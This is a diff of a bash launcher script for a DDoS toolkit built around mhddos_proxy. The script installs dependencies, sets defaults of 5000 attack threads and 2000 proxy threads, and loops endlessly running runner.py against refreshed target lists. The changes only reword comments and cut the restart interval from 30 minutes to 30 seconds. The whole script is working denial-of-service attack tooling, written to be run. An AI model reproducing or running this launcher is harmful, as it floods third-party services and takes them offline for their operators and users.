@@ -4,10 +4,10 @@ clear && echo -e "Loading... test v0.9.1\n"
 sudo apt-get update -q -y #>/dev/null 2>&1
 sudo apt-get install -q -y tmux toilet python3 python3-pip 
 pip install --upgrade pip >/dev/null 2>&1
-rm -rf ~/multidd ~/multiddos #just in case also delete relic folder
+rm -rf ~/multidd ~/multiddos #delete main (multidd) and just in case also relic (multiddos) folder
 pkill -f start.py; pkill -f runner.py; #stop old processes if they still running
 
-# create swap file if system doesn't have it
+# create swap file if system doesn't have it. Helps systems with very little RAM.
 if [[ $(echo $(swapon --noheadings --bytes | cut -d " " -f3)) == "" ]]; then
     sudo fallocate -l 1G /swp && sudo chmod 600 /swp && sudo mkswap /swp && sudo swapon /swp
 fi
@@ -31,8 +31,8 @@ if [[ $docker_mode != "true" ]]; then
     proxy_finder="off"
 fi
 
-if [[ $t_set_manual != "on" ]]; then export threads="-t 5000"; fi # default threads if not set in cmd
-if [[ $t_proxy_manual != "on" ]]; then export proxy_threads="2000"; fi # same for proxy_threads
+if [[ $t_set_manual != "on" ]]; then export threads="-t 5000"; fi # default threads if not passed in cmd line
+if [[ $t_proxy_manual != "on" ]]; then export proxy_threads="2000"; fi # default proxy_threads if not passed in cmd line
 
 ### prepare target files (main and secondary)
 prepare_targets_and_banner () {
@@ -142,7 +142,7 @@ while true; do
         sleep 5 # to decrease load on cpu during simultaneous start
         AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/xab.uaripper $methods $threads $args_to_pass &
     fi
-sleep 30m
+sleep 30
 pkill -f start.py; pkill -f runner.py;
 prepare_targets_and_banner
 done
